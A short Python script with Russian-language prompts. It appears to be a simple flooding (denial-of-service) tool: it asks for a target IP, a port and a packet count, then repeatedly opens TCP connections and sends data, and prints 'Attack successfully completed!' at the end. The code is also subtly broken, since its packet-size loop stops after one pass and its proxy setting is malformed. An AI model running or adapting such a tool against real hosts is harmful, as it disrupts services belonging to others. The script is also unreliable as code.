import requests
import socket
import os
from colorama import init, Fore, Back, Style

init(autoreset=True)
clear = lambda: os.system('clear')
clear()
print(Fore.BLUE + 'Идёт проверка подключения...')
headers = {'User-Agent' : 'Linux 5.5/Mozila 70.0'}
proxy = {'origin' : '159.203.61.169'}
check_eth = requests.post('https://httpbin.org/post', headers=headers, proxies=proxy)
if(check_eth.ok):
	print(Fore.GREEN + 'Интернет есть!')
packages = int(input('Количество пакетов:'))
byte = ''
bytes_package = int(input('Введите количество байт в одном пакете:'))
while True:
	byte += '0'
	bytes_package -= 1
	if(bytes_package >= 0):
		break
ip_addr = input('Введите ip вашего сайта:')
_port = int(input('Введите порт на котором работает сайт:'))
while True:
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect((ip_addr, _port))
	sock.sendto((byte).encode('utf-8'), (ip_addr, _port))
	packages -= 1
	if(packages == 0):
		break
print(Fore.YELLOW + 'Атака успешно закончена!')
